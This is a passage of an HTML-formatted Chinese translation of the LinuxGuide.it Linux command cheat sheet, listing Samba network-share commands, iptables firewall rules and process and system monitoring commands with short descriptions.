</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在<span class="s52">Whois </span>数据库中查找
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark58">Microsoft windows </a><span class="s50">网络</span>(samba)
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:49pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount -t smbfs -o username=user,password=pass

//WinClient/share /mnt/share
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个<span class="s52">windows </span>网络共享
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # nbtscan ip_addr
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    netbios <span class="s33">名解析</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # nmblookup -A ip_addr
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    netbios <span class="s33">名解析</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # smbclient -L ip_addr/hostname
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示一台<span class="s52">windows </span>主机的远程共享
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # smbget -Rr smb://ip_addr/share
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    像 <span class="s52">wget </span>一样能够通过 <span class="s52">smb </span>从一台 <span class="s52">windows</span>

主机上下载文件
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:19pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark59">IPTABLES (firewall)</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -L
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示过滤表的所有链路
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t nat -L
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示 <span class="s52">nat </span>表的所有链路
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -F
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以过滤表为依据清理所有规则
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t nat -F
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以 <span class="s52">nat </span>表为依据清理所有规则
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -X
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除所有由用户创建的链路
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    允许 <span class="s52">telnet </span>接入
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -A OUTPUT -p tcp -- dport http -j DROP
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    阻止<span class="s52">HTTP </span>连出
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -A FORWARD -p tcp -- dport pop3 -j ACCEPT
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    允许转发链路上的<span class="s52">POP3 </span>连接
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t filter -A INPUT -j LOG --log- prefix
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    记录所有链路中被查封的包
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t nat -A POSTROUTING -o eth0

-j MASQUERADE
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置一个<span class="s52">PAT (</span>端口地址转换<span class="s52">) </span>在<span class="s52">eth0 </span>掩盖发出包
</td></tr><tr style="height:49pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将发往一个主机地址的包转向到其他主机
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark60">监视和调试</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # free -m
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以兆为单位罗列<span class="s52">RAM </span>状态
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # kill -9 process_id
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    强行关闭进程并结束它
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # kill -1 process_id
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    强制一个进程重载其配置
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # last reboot
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示重启历史
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lsmod
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列装载的内核模块
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lsof -p process_id
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列一个由进程打开的文件列表
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lsof /home/user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列所给系统路径中所打开的文件的列表
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ps -eafw
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列 <span class="s52">linux </span>任务
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ps -e -o pid,args --forest
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以分级的方式罗列 <span class="s52">linux </span>任务
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # pstree
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以树状图显示程序
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # smartctl -A /dev/hda
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    通过启用 <span class="s52">SMART </span>监控硬盘设备的可靠性
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # smartctl -i /dev/hda
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    检查一个硬盘设备的<span class="s52">SMART </span>是否启用
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # strace -c ls &gt;/dev/null
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列系统<span class="s52">calls made </span>并用一个进程接收
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # strace -f -e open ls &gt;/dev/null
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列库调用
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tail /var/log/dmesg
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示内核引导过程中的内部事件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tail /var/log/messages
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示系统事件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # top
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列使用<span class="s52">CPU </span>资源最多的 <span class="s52">linux </span>任务
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # watch -n1 &#39;cat /proc/interrupts&#39;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列实时中断
